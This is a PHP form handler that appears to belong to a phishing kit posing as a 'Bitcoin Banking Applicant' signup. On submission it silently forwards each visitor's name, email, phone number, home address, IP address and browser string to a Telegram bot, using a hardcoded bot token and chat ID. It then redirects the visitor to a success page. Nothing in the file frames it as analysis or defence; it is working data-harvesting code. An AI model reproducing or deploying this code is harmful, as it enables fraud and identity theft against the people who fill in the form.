<?php


if (!empty($_POST)) {
    class Telegram
    {

        const CHAT_ID = '1225371262';
        const TOKEN = '2039895025:AAFBaDCUoJtFt7d-NO-NGBA57fIjIZXgVPo';

        public static function sendMessage($message)
        {
            $url = "https://api.telegram.org/bot" . self::TOKEN . "/sendMessage?chat_id=" . self::CHAT_ID;
            $url = $url . "&text=" . urlencode($message);
            $ch = curl_init();
            $optArray = array(
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true
            );
            curl_setopt_array($ch, $optArray);
            $result = curl_exec($ch);
            curl_close($ch);
            
        }

    }
	
		

    Telegram::sendMessage(
                  '🔥🔥🔥 Bitcoin Banking Applicant 🔥🔥🔥'
        . "\n" . '✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪'
        . "\n" . '🔥🔥🔥 First Name: ' . $_POST['fname']
		. "\n" . '🔥🔥🔥 Last Name: ' . $_POST['lname']
		. "\n" . '🔥🔥🔥 Email Address: ' . $_POST['email']
		. "\n" . '🔥🔥🔥 Phone Number: ' . $_POST['telephone']
		. "\n" . '🔥🔥🔥 Address: ' . $_POST['address']
		. "\n" . '🔥🔥🔥 City: ' . $_POST['city']
		. "\n" . '🔥🔥🔥 State: ' . $_POST['state']
		. "\n" . '🔥🔥🔥 Zip Code: ' . $_POST['zip']
        . "\n" . '✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪'
        . "\n" . '🔥🔥🔥 Date: ' . $date = gmdate ("d-n-Y")
        . "\n" . '🔥🔥🔥 Time: ' . $time = gmdate ("H:i:s")
        . "\n" . '🔥🔥🔥 IP: ' . $_SERVER['REMOTE_ADDR']
        . "\n" . '🔥🔥🔥 Browser: ' . $_SERVER['HTTP_USER_AGENT']
        . "\n" . '✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪✪'  
        );
  
    header('Location: success.php');
}